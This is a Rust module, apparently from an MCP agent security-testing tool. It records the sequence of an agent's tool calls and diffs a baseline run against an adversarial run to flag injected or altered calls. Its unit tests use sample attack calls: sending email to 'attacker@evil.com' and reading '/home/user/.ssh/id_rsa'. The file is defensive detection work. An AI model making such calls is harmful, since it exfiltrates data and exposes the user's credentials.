//! Sequence observer primitive (#13, rescoped).
//!
//! Unlike `runner::observer::Observer` (which scans each tool *response* in
//! isolation), this records the ordered *sequence* of tool calls so the
//! analyzer (#14) can reason across steps — detecting anomalies that only exist
//! in the relationship between calls (an injected call, an argument that
//! diverges from a baseline run, a credential path that surfaces mid-chain).
//!
//! [`SequenceLog`] is the recorded data and is constructed directly in unit
//! tests; [`SequenceObserver`] is the live recorder that wraps a [`Harness`].
//! [`diff`] compares a baseline run against an adversarial run.

use anyhow::Result;
use serde_json::Value;

use crate::protocol::mcp::CallToolResult;
use crate::protocol::transport::Transport;
use crate::runner::harness::Harness;

/// One recorded tool call: the tool name and the arguments it was invoked with.
#[derive(Debug, Clone, PartialEq)]
pub struct CallRecord {
    pub tool: String,
    pub args: Value,
}

impl CallRecord {
    pub fn new(tool: impl Into<String>, args: Value) -> Self {
        Self {
            tool: tool.into(),
            args,
        }
    }
}

/// An ordered log of tool calls made during one run.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct SequenceLog {
    calls: Vec<CallRecord>,
}

impl SequenceLog {
    pub fn new() -> Self {
        Self::default()
    }

    /// Build a log from a list of `(tool, args)` pairs — convenient in tests.
    pub fn from_calls(calls: impl IntoIterator<Item = CallRecord>) -> Self {
        Self {
            calls: calls.into_iter().collect(),
        }
    }

    pub fn record(&mut self, tool: impl Into<String>, args: Value) {
        self.calls.push(CallRecord::new(tool, args));
    }

    pub fn calls(&self) -> &[CallRecord] {
        &self.calls
    }

    pub fn is_empty(&self) -> bool {
        self.calls.is_empty()
    }

    /// Whether any recorded call targeted `tool`.
    pub fn contains_tool(&self, tool: &str) -> bool {
        self.calls.iter().any(|c| c.tool == tool)
    }
}

/// The difference between a baseline run and an adversarial run, from the
/// adversarial run's perspective.
/// Each entry pairs a call with its index in the adversarial sequence, so
/// consumers don't have to recover the position later.
#[derive(Debug, Default, PartialEq)]
pub struct SequenceDiff<'a> {
    /// Calls whose tool never appeared in the baseline — behavior the adversarial
    /// condition *introduced*.
    pub injected: Vec<(usize, &'a CallRecord)>,
    /// Calls to a tool that *did* appear in the baseline, but with different
    /// arguments — behavior the adversarial condition *altered*.
    pub diverged: Vec<(usize, &'a CallRecord)>,
}

/// Diff an adversarial run against a baseline. A call is `injected` if its tool
/// is absent from the baseline entirely, otherwise `diverged` if no baseline
/// call to the same tool used identical arguments.
pub fn diff<'a>(baseline: &SequenceLog, adversarial: &'a SequenceLog) -> SequenceDiff<'a> {
    let mut out = SequenceDiff::default();
    for (i, call) in adversarial.calls().iter().enumerate() {
        if !baseline.contains_tool(&call.tool) {
            out.injected.push((i, call));
        } else if !baseline
            .calls()
            .iter()
            .any(|b| b.tool == call.tool && b.args == call.args)
        {
            out.diverged.push((i, call));
        }
    }
    out
}

/// Wraps a [`Harness`] to record the sequence of tool calls made through it.
/// The result passes through unchanged; the call is appended to the log.
pub struct SequenceObserver<T: Transport> {
    harness: Harness<T>,
    log: SequenceLog,
}

impl<T: Transport> SequenceObserver<T> {
    pub fn new(harness: Harness<T>) -> Self {
        Self {
            harness,
            log: SequenceLog::new(),
        }
    }

    /// Record and forward a tool call.
    pub async fn call_tool(&mut self, name: &str, args: Option<Value>) -> Result<CallToolResult> {
        self.log.record(name, args.clone().unwrap_or(Value::Null));
        self.harness.call_tool(name, args).await
    }

    pub fn log(&self) -> &SequenceLog {
        &self.log
    }

    /// Consume the observer, returning the recorded sequence for analysis.
    pub fn into_log(self) -> SequenceLog {
        self.log
    }

    pub async fn close(&mut self) -> Result<()> {
        self.harness.close().await
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::protocol::session::SessionState;
    use crate::testutil::{ok_response, MockTransport};
    use serde_json::json;

    fn log(pairs: &[(&str, Value)]) -> SequenceLog {
        SequenceLog::from_calls(pairs.iter().map(|(t, a)| CallRecord::new(*t, a.clone())))
    }

    #[test]
    fn diff_flags_a_tool_absent_from_baseline_as_injected() {
        let baseline = log(&[("read_file", json!({"path": "a.txt"}))]);
        let adversarial = log(&[
            ("read_file", json!({"path": "a.txt"})),
            ("send_email", json!({"to": "attacker@evil.com"})),
        ]);
        let d = diff(&baseline, &adversarial);
        assert_eq!(d.injected.len(), 1);
        assert_eq!(d.injected[0].0, 1);
        assert_eq!(d.injected[0].1.tool, "send_email");
        assert!(d.diverged.is_empty());
    }

    #[test]
    fn diff_flags_changed_args_to_a_known_tool_as_diverged() {
        let baseline = log(&[("read_file", json!({"path": "a.txt"}))]);
        let adversarial = log(&[("read_file", json!({"path": "/home/user/.ssh/id_rsa"}))]);
        let d = diff(&baseline, &adversarial);
        assert!(d.injected.is_empty());
        assert_eq!(d.diverged.len(), 1);
        assert_eq!(d.diverged[0].1.tool, "read_file");
    }

    #[test]
    fn diff_is_empty_for_identical_runs() {
        let a = log(&[("ping", json!({}))]);
        let b = log(&[("ping", json!({}))]);
        assert_eq!(diff(&a, &b), SequenceDiff::default());
    }

    #[tokio::test]
    async fn observer_records_calls_in_order() {
        let mut h = Harness::new(MockTransport::new(vec![
            ok_response(1, json!({"content": [{"type": "text", "text": "ok"}]})),
            ok_response(2, json!({"content": [{"type": "text", "text": "ok"}]})),
        ]));
        h.session.state = SessionState::Ready;
        let mut obs = SequenceObserver::new(h);
        obs.call_tool("alpha", Some(json!({"x": 1}))).await.unwrap();
        obs.call_tool("beta", None).await.unwrap();
        let log = obs.into_log();
        assert_eq!(log.calls().len(), 2);
        assert_eq!(log.calls()[0].tool, "alpha");
        assert_eq!(log.calls()[0].args, json!({"x": 1}));
        assert_eq!(log.calls()[1].tool, "beta");
        assert_eq!(log.calls()[1].args, Value::Null);
    }
}
